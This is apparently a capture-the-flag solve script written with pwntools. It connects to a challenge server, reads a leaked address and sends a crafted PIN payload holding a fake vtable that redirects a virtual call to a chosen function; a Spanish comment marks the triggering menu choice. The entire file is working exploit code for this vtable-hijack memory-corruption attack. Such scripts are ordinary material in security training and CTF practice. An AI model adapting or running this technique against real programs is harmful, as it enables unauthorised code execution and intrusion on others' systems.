from pwn import *
elf = context.binary = ELF("./main")
#io = process('./main')
io = remote("challs.breachers.in",1339)

io.sendlineafter(b"choice: ", b"2")
fake_vtable_addr = p64(int(io.recvline().strip(),16))

fake_vtable = p64(0x41414141) + p64(0x42424242) + p64(0x004011f6)
payload = fake_vtable + fake_vtable_addr

io.sendlineafter(b"choice: ", b"1")
io.sendlineafter(b"PIN: ", payload)
# Al llamar a BackupVault_triggerAllarm esta buscara
io.sendlineafter(b"choice: ", b"6")
print(io.recv())
